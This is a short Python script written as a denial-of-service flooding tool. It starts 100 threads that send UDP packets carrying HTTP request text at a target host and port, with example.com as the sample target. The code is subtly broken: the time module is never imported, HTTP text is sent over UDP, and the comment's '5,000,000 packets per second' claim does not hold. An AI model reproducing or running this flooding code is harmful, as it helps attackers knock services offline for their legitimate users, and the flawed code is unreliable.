import socket
import threading

def ddos(target, port, duration):
    # Create a socket object
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Get the IP address of the target
    ip = socket.gethostbyname(target)

    # Start the attack
    start_time = time.time()
    while True:
        if time.time() - start_time > duration:
            break
        # Send a packet to the target
        client.sendto(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n", (ip, port))
        # Send 5,000,000 packets per second
        for _ in range(5000000):
            client.sendto(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n", (ip, port))

# Example usage
target = "example.com"
port = 80
duration = 1  # 1 second

# Create multiple threads to simulate a DDoS attack
threads = []
for _ in range(100):
    thread = threading.Thread(target=ddos, args=(target, port, duration))
    thread.start()
    threads.append(thread)

# Wait for all threads to finish
for thread in threads:
    thread.join()